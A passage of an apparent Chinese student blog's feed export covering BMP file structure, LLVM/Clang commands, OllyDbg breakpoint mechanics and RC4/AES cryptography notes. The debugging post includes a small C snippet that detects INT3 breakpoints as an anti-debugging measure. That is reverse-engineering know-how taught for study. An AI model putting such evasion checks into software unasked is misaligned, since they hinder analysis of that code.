href="https://blog.csdn.net/weixin_44558065/article/details/112556436?ops_request_misc=%7B%22request_id%22:%22166547262916782391845752%22,%22scm%22:%2220140713.130102334.pc_all.%22%7D&amp;request_id=166547262916782391845752&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-1-112556436-null-null.142%5Ev52%5Ejs_top,201%5Ev3%5Eadd_ask&amp;utm_term=BMP">https://blog.csdn.net/weixin_44558065/article/details/112556436?ops_request_misc=%7B%22request%5Fid%22%3A%22166547262916782391845752%22%2C%22scm%22%3A%2220140713.130102334.pc%5Fall.%22%7D&amp;request_id=166547262916782391845752&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-1-112556436-null-null.142^v52^js_top,201^v3^add_ask&amp;utm_term=BMP</a> 图像的信息隐藏与提取&amp;spm=1018.2226.3001.4187)</p><h3 id="2-4-5：BMP-图像文件的读取任务"><a href="#2-4-5：BMP-图像文件的读取任务" class="headerlink" title="2.4-5：BMP 图像文件的读取任务"></a>2.4-5：BMP 图像文件的读取任务</h3><h4 id="BMP图像的基本知识"><a href="#BMP图像的基本知识" class="headerlink" title="BMP图像的基本知识"></a>BMP图像的基本知识</h4><ol><li><strong>BMP概念</strong></li></ol><p>​        BMP是英文Bitmap（位图）的简写，它是Windows操作系统中的标准图像文件格式，能够被多种Windows应用程序所支持。优点是：包含的图像信息较丰富，几乎不进行压缩，缺点是：占用磁盘空间较大，在单机上比较流行。</p><p>​        BMP位图文件默认的<strong>文件扩展名</strong>是BMP或者bmp（有时它也会以.DIB或.RLE作扩展名）</p><ol start="2"><li><p><strong>BMP格式结构(从文件头开始)</strong></p><ul><li>**位图文件头(bmp file header)**：提供文件的格式、大小等信息</li><li>**位图信息头(bitmap information)**：提供图像数据的尺寸、位平面数、压缩方式、颜色索引等信息</li><li>**调色板(color palette)**：可选，如使用索引来表示图像，调色板就是索引与其对应的颜色的映射表</li><li>**位图数据(bitmap data)**：图像数据区</li></ul><p><strong>BMP图片文件数据表如下</strong>：</p><p><img src="/2022/09062913/BLOG/hexoblog\source_posts\大三上课程\信息隐藏-3.png" alt="信息隐藏-3"></p></li><li><p><strong>BMP文件头结构体定义</strong>：</p></li></ol><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">tagBITMAPFILEHEADER</span><span class="token punctuation">&#123;</span> UINT16 bfType<span class="token punctuation">;</span>        <span class="token comment">//2Bytes，必须为"BM"，即0x424D 才是Windows位图文件</span>DWORD bfSize<span class="token punctuation">;</span>         <span class="token comment">//4Bytes，整个BMP文件的大小</span>UINT16 bfReserved1<span class="token punctuation">;</span>  <span class="token comment">//2Bytes，保留，为0</span>UINT16 bfReserved2<span class="token punctuation">;</span>  <span class="token comment">//2Bytes，保留，为0</span>DWORD bfOffBits<span class="token punctuation">;</span>     <span class="token comment">//4Bytes，文件起始位置到图像像素数据的字节偏移量</span><span class="token punctuation">&#125;</span> BITMAPFILEHEADER<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>​        <strong>BMP文件头数据表如下</strong>：</p><p>​        <img src="/2022/09062913/BLOG/hexoblog\source_posts\大三上课程\4.png" alt="4"></p><p><img src="/2022/09062913/BLOG/hexoblog\source_posts\大三上课程\5.png" alt="5"></p><p><img src="/2022/09062913/BLOG/hexoblog\source_posts\大三上课程\6.png" alt="6"></p><p><img src="/2022/09062913/BLOG/hexoblog\source_posts\大三上课程\7.png" alt="7"></p><ol start="4"><li><strong>BMP信息头结构体定义如下</strong>：</li></ol><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">_tagBMP_INFOHEADER</span> <span class="token punctuation">&#123;</span> DWORD  biSize<span class="token punctuation">;</span>    <span class="token comment">//4Bytes，INFOHEADER结构体大小，存在其他版本I NFOHEADER，用作区分</span> LONG   biWidth<span class="token punctuation">;</span>    <span class="token comment">//4Bytes，图像宽度（以像素为单位）</span> LONG   biHeight<span class="token punctuation">;</span>    <span class="token comment">//4Bytes，图像高度，+：图像存储顺序为Bottom2Top，-：Top2Bottom</span> WORD   biPlanes<span class="token punctuation">;</span>    <span class="token comment">//2Bytes，图像数据平面，BMP存储RGB数据，因此总为1</span> WORD   biBitCount<span class="token punctuation">;</span>         <span class="token comment">//2Bytes，图像像素位数</span> DWORD  biCompression<span class="token punctuation">;</span>     <span class="token comment">//4Bytes，0：不压缩，1：RLE8，2：RLE4</span> DWORD  biSizeImage<span class="token punctuation">;</span>       <span class="token comment">//4Bytes，4字节对齐的图像数据大小</span> LONG   biXPelsPerMeter<span class="token punctuation">;</span>   <span class="token comment">//4 Bytes，用象素/米表示的水平分辨率</span> LONG   biYPelsPerMeter<span class="token punctuation">;</span>   <span class="token comment">//4 Bytes，用象素/米表示的垂直分辨率</span> DWORD  biClrUsed<span class="token punctuation">;</span>          <span class="token comment">//4 Bytes，实际使用的调色板索引数，0：使用所有的调色板索引</span> DWORD biClrImportant<span class="token punctuation">;</span>     <span class="token comment">//4 Bytes，重要的调色板索引数，0：所有的调色板索引都重要</span> <span class="token punctuation">&#125;</span>BMP_INFOHEADER<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>BMP信息头数据表如下</strong>：</p><p><img src="/2022/09062913/BLOG/hexoblog\source_posts\大三上课程\8.png" alt="8"></p><ol start="5"><li><strong>BMP调色板结构体定义如下</strong>：</li></ol><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">_tagRGBQUAD</span><span class="token punctuation">&#123;</span>    BYTE  rgbBlue<span class="token punctuation">;</span>       <span class="token comment">//指定蓝色强度</span>    BYTE  rgbGreen<span class="token punctuation">;</span>      <span class="token comment">//指定绿色强度</span>    BYTE  rgbRed<span class="token punctuation">;</span>        <span class="token comment">//指定红色强度</span>    BYTE  rgbReserved<span class="token punctuation">;</span>  <span class="token comment">//保留，设置为0</span><span class="token punctuation">&#125;</span> RGBQUAD<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>​        1，4，8位图像才会使用调色板数据，16,24,32位图像不需要调色板数据，即调色板最多只需要256项（索引0 - 255）。</p><p>​        颜色表的大小根据所使用的颜色模式而定：2色图像为8字节；16色图像位64字节；256色图像为1024字节。其中，每4字节表示一种颜色，并以B（蓝色）、G（绿色）、R（红色）、alpha（32位位图的透明度值，一般不需要）。即首先4字节表示颜色号1的颜色，接下来表示颜色号2的颜色，依此类推。</p><p>​        颜色表中RGBQUAD结构数据的个数有biBitCount来确定，当biBitCount=1,4,8时，分别有2,16,256个表项。</p><p>​        当biBitCount=1时，为2色图像，BMP位图中有2个数据结构RGBQUAD，一个调色板占用4字节数据，所以2色图像的调色板长度为2*4为8字节。</p><p>​        当biBitCount=4时，为16色图像，BMP位图中有16个数据结构RGBQUAD，一个调色板占用4字节数据，所以16像的调色板长度为16*4为64字节。</p><p>​        当biBitCount=8时，为256色图像，BMP位图中有256个数据结构RGBQUAD，一个调色板占用4字节数据，所以256色图像的调色板长度为256*4为1024字节。</p><p>​        当biBitCount=16，24或32时，没有颜色表。</p><p><strong>BMP图像数据区</strong>:</p><p>​        位图数据记录了位图的每一个像素值，记录顺序是在扫描行内是从左到右,扫描行之间是从下到上。位图的一个像素值所占的字节数:</p><p>​        当biBitCount=1时，8个像素占1个字节;</p><p>​        当biBitCount=4时，2个像素占1个字节;</p><p>​        当biBitCount=8时，1个像素占1个字节;</p><p>​        当biBitCount=24时,1个像素占3个字节;</p><p>​        Windows规定一个扫描行所占的字节数必须是4的倍数(即以long为单位),不足的以0填充，</p><p>一个扫描行所占的字节数计算方法:</p><p>​        DataSizePerLine= (biWidth* biBitCount+31)/8;// 一个扫描行所占的字节数</p><p>​        DataSizePerLine= DataSizePerLine/4*4; // 字节数必须是4的倍数位图数据的大小(不压缩情况下):</p><p>​        DataSize= DataSizePerLine* biHeight;</p><p>​        颜色表接下来位为位图文件的图像数据区，在此部分记录着每点像素对应的颜色号，其记录方式也随颜色模式而定，既2色图像每点占1位（8位为1字节）；16色图像每点占4位（半字节）；256色图像每点占8位（1字节）；真彩色图像每点占24位（3字节）。所以，整个数据区的大小也会随之变化。究其规律而言，可的出如下计算公式：图像数据信息大小=（图像宽度<em>图像高度</em>记录像素的位数）/8</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>LLVM-Clang编译器安装和使用</title>
      <link href="/2022/031262045.html"/>
      <url>/2022/031262045.html</url>
      
        <content type="html"><![CDATA[<p>转载于：<a href="L1uis1'sblog">L1uis1’sblog</a></p><article class="post-content" id="article-container"><h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><blockquote><ol><li>apt-get install clang</li></ol></blockquote><blockquote><ol start="2"><li>apt-get install llvm</li></ol></blockquote><h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><h2 id="LLVM-IR文件"><a href="#LLVM-IR文件" class="headerlink" title="LLVM IR文件"></a>LLVM IR文件</h2><ol><li><p>使用clang将C源码转换为LLVM IR(文本形式)：</p><blockquote><p>clang -emit-llvm -S test.c -o test.ll / clang -O3 -emit-llvm test.c -S -o test.ll</p></blockquote></li><li><p>使用clang将C源码转换为LLVM IR(二进制形式)：</p><blockquote><p>clang -emit-llvm test.c -c -o test.bc / clang -O3 -emit-llvm test.c -c -o test.bc</p></blockquote></li><li><p>LLVM IR文件格式转换(.bc和.ll文件的转换)</p><blockquote><p>llvm-as test.ll -o test.bc     //llvm .ll -&gt; .bc assembler<br>llvm-dis test.bc -o test.ll  //llvm .bc -&gt; .ll disassembler</p></blockquote></li><li><p>将LLVM字节码转换为机器汇编码</p><blockquote><p>llc test.bc -o test.s</p></blockquote></li><li><p>由LLVM IR生成对应的可执行文件</p><blockquote><p>llc -filetype=obj test.ll -o test.o<br>gcc test.o<br>或者<br>llc -filetype=obj test.bc -o test.o<br>gcc test.o</p></blockquote></li></ol><p>注：生成可执行文件时，若出现如下或类似的报错</p><figure class="highlight bash"><div class="highlight-tools "><i class="fas fa-angle-down expand "></i><div class="code-lang">bash</div><div class="copy-notice"></div><i class="fas fa-paste copy-button"></i></div><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/ld: test.o: relocation R_X86_64_32 against symbol `what<span class="string">' can not be used when making a PIE object; recompile with -fPIE</span></span><br><span class="line"><span class="string">collect2: error: ld returned 1 exit status</span></span><br></pre></td></tr></tbody></table></figure><p>使用</p><blockquote><p>clang++  test.o -o test</p></blockquote></article>  ]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>od使用</title>
      <link href="/2022/011152450.html"/>
      <url>/2022/011152450.html</url>
      
        <content type="html"><![CDATA[<h2 id="od部分原理"><a href="#od部分原理" class="headerlink" title="od部分原理"></a>od部分原理</h2><h3 id="常见断点之INT3断点原理"><a href="#常见断点之INT3断点原理" class="headerlink" title="常见断点之INT3断点原理"></a>常见断点之INT3断点原理</h3><ol><li>原理<br>F2断点又叫做CC断点（INT3）断点。<br>01 替换指令，也就是替换int3指令<br>02 od检测到int3指令之后会产生一个异常处理并捕获它，这时候程序就会中断<br>03 od删除int3指令，还原之前代码  </li><li>优点<br>可以无限下int3断点  </li><li>缺点<br>太容易被检测到  </li></ol><h3 id="INT3断点的反调试与反反调试"><a href="#INT3断点的反调试与反反调试" class="headerlink" title="INT3断点的反调试与反反调试"></a>INT3断点的反调试与反反调试</h3><ol><li><p>知识点<br>01 FARPROC结构体<br>02 GetprocAddress()函数:检索指定的动态链接库(DLL)中的输出库函数地址。<br>03 LoadLibrary()函数:将指定的模块加载到调用进程的地址空间中。指定的模块可能会导致其他模块被加载。对于其他加载选项，请使用 LoadLibraryEx函数。  </p></li><li><p>函数原型<br>GetprocAddress()函数原型：</p><pre><code class="c"> FARPROC GetProcAddress(       HMODULE   hModule,    // DLL模块句柄       LPCSTR       lpProcName   // 函数名   );  </code></pre></li><li><p>代码  </p><pre><code class="c"> #include &lt;iostream&gt; #include &lt;Windows.h&gt; int main() &#123;     FARPROC addr = GetProcAddress(LoadLibrary(L&quot;user32.dll&quot;), &quot;MessageBoxA&quot;);     byte byteAdder = *(byte*)addr;     ::MessageBoxA(NULL, &quot;内容&quot;, &quot;标题&quot;, MB_OK);//调用MessageBoxA()     if (byteAdder == 0xCC) &#123;         printf(&quot;检测到非法调试&quot;);     &#125;     else &#123;         printf(&quot;程序正常运行&quot;);     &#125;     getchar(); &#125;  </code></pre></li><li><p>反调试<br>未进行调试时:<br><img src="/2022/011152450/1.png" alt=" "><br>对MessageBoxA()进行下断点:<br><img src="/2022/011152450/2.png" alt=" ">  </p></li><li><p>反反调试<br>在MessageBoxA()下面一行代码下INT3断点<br><img src="/2022/011152450/3.png" alt=" "><br><img src="/2022/011152450/1.png" alt=" ">  </p></li></ol><h3 id="常用断点之硬件断点"><a href="#常用断点之硬件断点" class="headerlink" title="常用断点之硬件断点"></a>常用断点之硬件断点</h3><ol><li>调试寄存器<br>DR0–DR7<br>DR0–DR3 :保存断点地址 ;DR4–DR5 ;DR6 :状态寄存器 ;DR7 :控制寄存器  </li><li>原理<br>DR0–DR3 :保存下硬件断点的地址<br>DR7 :设置相对应的控制位<br>当运行到此位置是会发送一个异常信息，导致程序中断，等待用户操作  </li><li>优点 ：不易被检测，速度快<br>缺点 : 只能下四个断点  </li></ol><h3 id="常用断点之内存断点"><a href="#常用断点之内存断点" class="headerlink" title="常用断点之内存断点"></a>常用断点之内存断点</h3><ol><li>原理<br>在该位置下内存断点，导致该位置赋予不可读、不可写、不可执行的属性，从而运行到此处时发送异常，导致程序中断。  </li><li>优点：不改变汇编代码<br>缺点：无  </li></ol><h3 id="常见断点之消息断点"><a href="#常见断点之消息断点" class="headerlink" title="常见断点之消息断点"></a>常见断点之消息断点</h3><ol><li>原理<br>当点击或者处理一个事件时，会形成消息，想内核发送，内核进行识别并做出相应的处理  </li></ol><h3 id="常见断点之条件断点"><a href="#常见断点之条件断点" class="headerlink" title="常见断点之条件断点"></a>常见断点之条件断点</h3><ol><li>触发：shirt+F2  </li><li>类似int3断点，只是要加条件断  </li><li>多条件用&amp;&amp;，|| 连接符  </li></ol><h3 id="内存一次性断点和条件记录断点"><a href="#内存一次性断点和条件记录断点" class="headerlink" title="内存一次性断点和条件记录断点"></a>内存一次性断点和条件记录断点</h3><ol><li>内存一次性断点：alt+m，断点原理是int3断点原理，但是只能用一次  </li><li>条件记录断点：shirt+F4，类似条件断点，但是alt+l可以查看断点位置特定寄存器等的值  </li></ol><h3 id="hit-trace-和-run-trace"><a href="#hit-trace-和-run-trace" class="headerlink" title="hit trace 和 run trace"></a>hit trace 和 run trace</h3><ol><li>原理 int3断点原理  </li><li>run trace 记录数据</li></ol>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>密码类型及加密解密算法</title>
      <link href="/2021/120547052.html"/>
      <url>/2021/120547052.html</url>
      
        <content type="html"><![CDATA[<h2 id="现代密码"><a href="#现代密码" class="headerlink" title="现代密码"></a>现代密码</h2><h3 id="对称加密算法"><a href="#对称加密算法" class="headerlink" title="对称加密算法"></a>对称加密算法</h3><p>对称加密算法，也就是说使用的密钥为单钥（或称为私钥）。就是明文加密和密文解密用的是同一种秘钥<br>例如:  </p><h4 id="rc4加密算法"><a href="#rc4加密算法" class="headerlink" title="rc4加密算法"></a>rc4加密算法</h4><ol><li>说明：rc4加密是字节流的方式依次加密明文中的每一个字节，解密的时候也是依次对密文中的每一个字节进行解密，同时密钥的长度是可以变的，对于现在仍然有很强的保护性  </li><li>原理：根据明文和密钥生成相应的密钥流，密钥流的长度和明文的长度是对应的，也就是说明文的长度是500字节，那么密钥流也是500字节。当然，加密生成的密文也是500字节，因为密文第i字节=明文第i字节^密钥流第i字节。而生成密钥流需要用到状态向量（S），临时向量（T），密钥（K）即：  <ul><li>状态向量S：长度为256，S[0],S[1]…..S[255]。每个单元都是一个字节，算法运行的任何时候，S都包括0-255的8比特数的排列组合，只不过值的位置发生了变换  </li><li>临时向量T：长度也为256，每个单元也是一个字节。如果密钥的长度是256字节，就直接把密钥的值赋给T，否则，轮转地将密钥的每个字节赋给T  </li><li>密钥K：长度为1-256字节，注意密钥的长度keylen与明文长度、密钥流的长度没有必然关系，通常密钥的长度趣味16字节（128比特）  <ul><li>初始化S和T<br>for i in range(256) :<br>s[i] = i<br>T[i]=Key[i%len(key)] (key是密钥)  </li><li>初始排列S<br>j = 0<br>for i in range(256) :<br>j = (j + s[i] + T[i]) % 256<br>s[i], s[j] = s[j], s[i]  </li><li>产生密钥流K<br>i = 0<br>j = 0<br>for r in range(len(message)) :<br>i = (i + 1) % 256<br>j = (j + s[i]) % 256<br>s[i], s[j] = s[j], s[i]<br>t = (S[i] + S[j]) % 256<br>K[t] = S[t] (K即是密钥流)  </li><li>脚本：  </li></ul></li></ul></li></ol><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">encrypt</span><span class="token punctuation">(</span>tmp<span class="token punctuation">,</span> message<span class="token punctuation">)</span><span class="token punctuation">:</span>      tmp <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">map</span><span class="token punctuation">(</span><span class="token keyword">lambda</span> x<span class="token punctuation">:</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">,</span> tmp<span class="token punctuation">)</span><span class="token punctuation">)</span>      message <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">map</span><span class="token punctuation">(</span><span class="token keyword">lambda</span> x<span class="token punctuation">:</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">,</span> message<span class="token punctuation">)</span><span class="token punctuation">)</span>       S <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">)</span>      key <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>  <span class="token comment"># 存储秘钥流  </span>    T <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>  <span class="token comment"># 临时向量T   </span>    <span class="token keyword">while</span> <span class="token builtin">len</span><span class="token punctuation">(</span>T<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">256</span><span class="token punctuation">:</span>          T<span class="token punctuation">.</span>extend<span class="token punctuation">(</span>tmp<span class="token punctuation">)</span>      <span class="token keyword">while</span> <span class="token builtin">len</span><span class="token punctuation">(</span>T<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">256</span><span class="token punctuation">:</span>          T<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span>       j <span class="token operator">=</span> <span class="token number">0</span>      <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>          j <span class="token operator">=</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> S<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> T<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span>          S<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> S<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> S<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> S<span class="token punctuation">[</span>i<span class="token punctuation">]</span>       i<span class="token punctuation">,</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span>      <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>message<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>          i <span class="token operator">=</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span>          j <span class="token operator">=</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> S<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span>          S<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> S<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> S<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> S<span class="token punctuation">[</span>i<span class="token punctuation">]</span>          t <span class="token operator">=</span> <span class="token punctuation">(</span>S<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> S<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span>          key<span class="token punctuation">.</span>append<span class="token punctuation">(</span>S<span class="token punctuation">[</span>t<span class="token punctuation">]</span><span class="token punctuation">)</span>       secretary <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">map</span><span class="token punctuation">(</span><span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y<span class="token punctuation">:</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>x <span class="token operator">^</span> y<span class="token punctuation">)</span><span class="token punctuation">,</span> message<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token keyword">return</span> secretary<span class="token punctuation">,</span> key  <span class="token keyword">def</span> <span class="token function">decrypt</span><span class="token punctuation">(</span>secretary<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">:</span>      message <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">map</span><span class="token punctuation">(</span><span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y<span class="token punctuation">:</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">^</span> y<span class="token punctuation">)</span><span class="token punctuation">,</span> secretary<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token keyword">return</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>message<span class="token punctuation">)</span>  <span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>      t <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"请输入初始秘钥："</span><span class="token punctuation">)</span><span class="token punctuation">)</span>      m <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"请输入需要加密的明文："</span><span class="token punctuation">)</span><span class="token punctuation">)</span>      s<span class="token punctuation">,</span> k <span class="token operator">=</span> encrypt<span class="token punctuation">(</span>t<span class="token punctuation">,</span> m<span class="token punctuation">)</span>      <span class="token keyword">print</span><span class="token punctuation">(</span>encrypt<span class="token punctuation">(</span>t<span class="token punctuation">,</span> m<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># t即为所求 </span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'经过加密解密后得到的明文：'</span><span class="token punctuation">,</span> decrypt<span class="token punctuation">(</span>s<span class="token punctuation">,</span> k<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="AES加密算法"><a href="#AES加密算法" class="headerlink" title="AES加密算法"></a>AES加密算法</h4><ol><li>AES为分组密码，分组密码也就是把明文分成一组一组的，每组长度相等，每次加密一组数据，直到加密完整个明文。在AES标准规范中，分组长度只能是128位，也就是说，每个分组为16个字节（每个字节8位）。密钥的长度可以使用128位、192位或256位。密钥的长度不同，推荐加密轮数也不同，如下表所示：<br><img src="/2021/120547052/1.png" alt=" "><br>轮数在下面介绍，这里实现的是AES-128，也就是密钥的长度为128位，加密轮数为10轮。上面说到，AES的加密公式为C = E(K,P)，在加密函数E中，会执行一个轮函数，并且执行10次这个轮函数，这个轮函数的前9次执行的操作是一样的，只有第10次有所不同。也就是说，一个明文分组会被加密10轮。AES的核心就是实现一轮中的所有操作。   AES的处理单位是字节，128位的输入明文分组P和输入密钥K都被分成16个字节，分别记为P = P0 P1 … P15 和 K = K0 K1 … K15。如，明文分组为P = abcdefghijklmnop,其中的字符a对应P0，p对应P15。一般地，明文分组用字节为单位的正方形矩阵描述，称为状态矩阵。在算法的每一轮中，状态矩阵的内容不断发生变化，最后的结果作为密文输出。该矩阵中字节的排列顺序为从上到下、从左至右依次排列，如下图所示：<br> <img src="/2021/120547052/2.png" alt=" "><br> 其主要加密如下(10次加密图)：<br> <img src="/2021/120547052/3.png" alt=" "><br> 其中:  <ul><li>K = “abcdefghijklmnop”，则K0 = a, K15 = p, W[0] = K0 K1 K2 K3 = “abcd”。AES的整体结构如下图所示，其中的W[0,3]是指W[0]、W[1]、W[2]和W[3]串联组成的128位密钥。加密的第1轮到第9轮的轮函数一样，包括4个操作：字节代换、行位移、列混合和轮密钥加。最后一轮迭代不执行列混合。另外，在第一轮迭代之前，先将明文和原始密钥进行一次异或加密操作。  </li></ul></li></ol><ul><li>字节代换：  </li></ul><ol><li><p>AES的字节代换其实就是一个简单的查表操作。AES定义了一个S盒和一个逆S盒。<br>AES的S盒：<br><img src="/2021/120547052/4.png" alt=" "><br>状态矩阵中的元素按照下面的方式映射为一个新的字节：把该字节的高4位作为行值，低4位作为列值，取出S盒或者逆S盒中对应的行的元素作为输出。例如，加密时，输出的字节S1为0x12,则查S盒的第0x01行和0x02列，得到值0xc9,然后替换S1原有的0x12为0xc9。<br>逆字节代换也就是查逆S盒来变换，逆S盒如下：<br><img src="/2021/120547052/5.png" alt=" ">  </p></li><li><p>计算方式进行字节代换<br>AES算法中定义的加法和乘法<br>加法：两个字节相加，其和为两个字节按比特异或的结果<br>乘法：两个字节相乘，其积为对应多项式的乘积模二元域GF(2)上的8次不可约多项式m(x)==x^8⊕x^4⊕x^3⊕x⊕1后的结果所对应的字节<br>例如：<br><img src="/2021/120547052/47.png" alt=" "><br>再者<br><img src="/2021/120547052/48.png" alt=" ">  </p></li></ol><ul><li>行移位<br>行移位是一个简单的左循环移位操作。当密钥长度为128比特时，状态矩阵的第0行左移0字节，第1行左移1字节，第2行左移2字节，第3行左移3字节<br>行移位的逆变换是将状态矩阵中的每一行执行相反的移位操作，例如AES-128中，状态矩阵的第0行右移0字节，第1行右移1字节，第2行右移2字节，第3行右移3字节  </li><li>列混合<br>列混合变换是通过矩阵相乘来实现的，经行移位后的状态矩阵与固定的矩阵相乘，得到混淆后的状态矩阵，如下图的公式所示：<br><img src="/2021/120547052/6.png" alt=" "><br>状态矩阵中的第j列(0 ≤j≤3)的列混合可以表示为下图所示：<br><img src="/2021/120547052/7.png" alt=" "><br>其中，矩阵元素的乘法和加法都是定义在基于GF(2^8)上的二元运算,并不是通常意义上的乘法和加法。<br>逆向列混合变换可由下图的矩阵乘法定义：<br><img src="/2021/120547052/8.png" alt=" "></li><li>轮密钥加<br>轮密钥加是将128位轮密钥Ki同状态矩阵中的数据进行逐位异或操作，如下图所示。其中，密钥Ki中每个字W[4i],W[4i+1],W[4i+2],W[4i+3]为32位比特字，包含4个字节，他们的生成算法下面在下面介绍。轮密钥加过程可以看成是字逐位异或的结果，也可以看成字节级别或者位级别的操作。也就是说，可以看成S0 S1 S2 S3 组成的32位字与W[4i]的异或运算；轮密钥加的逆运算同正向的轮密钥加运算完全一致，这是因为异或的逆操作是其自身。轮密钥加非常简单，但却能够影响S数组中的每一位。  </li><li>密钥扩展<br>AES首先将初始密钥输入到一个44的状态矩阵中，如下图所示。<br><img src="/2021/120547052/9.png" alt=" "><br>这个44矩阵的每一列的4个字节组成一个字，矩阵4列的4个字依次命名为W[0]、W[1]、W[2]和W[3]，它们构成一个以字为单位的数组W。例如，设密钥K为”abcdefghijklmnop”,则K0 = ‘a’,K1 = ‘b’, K2 = ‘c’,K3 = ‘d’,W[0] = 